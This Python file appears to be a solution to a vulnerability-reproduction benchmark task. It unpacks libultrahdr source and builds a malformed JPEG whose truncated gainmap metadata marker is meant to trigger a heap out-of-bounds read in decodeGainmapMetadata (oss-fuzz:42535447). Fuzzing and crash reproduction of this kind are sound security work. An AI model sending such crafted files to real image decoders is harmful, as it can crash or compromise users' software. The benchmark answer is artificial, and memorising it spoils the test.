import os
import tarfile
import struct
import shutil

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow in libultrahdr.
        Analysis of the vulnerability (oss-fuzz:42535447) indicates an issue in 
        decodeGainmapMetadata where a size check might be insufficient or an 
        integer underflow occurs during offset calculation, leading to OOB read.
        """
        
        # 1. Extract source to identify the correct marker signature dynamically
        extract_path = '/tmp/libultrahdr_src'
        if os.path.exists(extract_path):
            shutil.rmtree(extract_path)
        os.makedirs(extract_path, exist_ok=True)
        
        try:
            with tarfile.open(src_path, 'r:*') as tar:
                tar.extractall(extract_path)
        except Exception:
            pass

        # 2. Determine signature and marker type
        # Default to XMP in APP1 if nothing better is found
        marker_byte = 0xE1 # APP1
        signature = b'http://ns.adobe.com/xap/1.0/\0'
        
        # Scan for binary gainmap signatures (ISO 21496-1 or internal)
        # This is more likely the vector for decodeGainmapMetadata binary parsing bugs
        found_binary = False
        
        for root, dirs, files in os.walk(extract_path):
            for file in files:
                if file.endswith('.cpp'):
                    try:
                        filepath = os.path.join(root, file)
                        with open(filepath, 'rb') as f:
                            content = f.read()
                            # Check for the ISO signature often associated with binary gainmaps
                            if b'urn:iso:std:21496:1' in content:
                                marker_byte = 0xE2 # APP2
                                signature = b'urn:iso:std:21496:1\0'
                                found_binary = True
                                break
                    except Exception:
                        continue
            if found_binary:
                break
        
        # 3. Construct the PoC JPEG
        # Structure: SOI + JFIF + Vulnerable Marker + EOI
        
        poc = bytearray(b'\xFF\xD8') # SOI
        
        # JFIF Header (standard 16 bytes payload + 2 bytes marker)
        # Often required for decoders to recognize the file as JPEG
        poc += b'\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
        
        # Vulnerable Marker
        # The vulnerability is in decodeGainmapMetadata.
        # We provide a payload that passes the signature check but is structurally invalid 
        # (too short for the version 0 header), triggering the OOB read/underflow.
        
        # Payload content: Version 0 (1 byte) + minimal garbage.
        # The goal is to be shorter than sizeof(uhdr_gainmap_metadata_ext_t).
        payload_data = b'\x00' + b'\xAA' * 4 
        
        marker_length = 2 + len(signature) + len(payload_data)
        
        poc += bytes([0xFF, marker_byte])
        poc += struct.pack('>H', marker_length)
        poc += signature
        poc += payload_data
        
        poc += b'\xFF\xD9' # EOI
        
        return bytes(poc)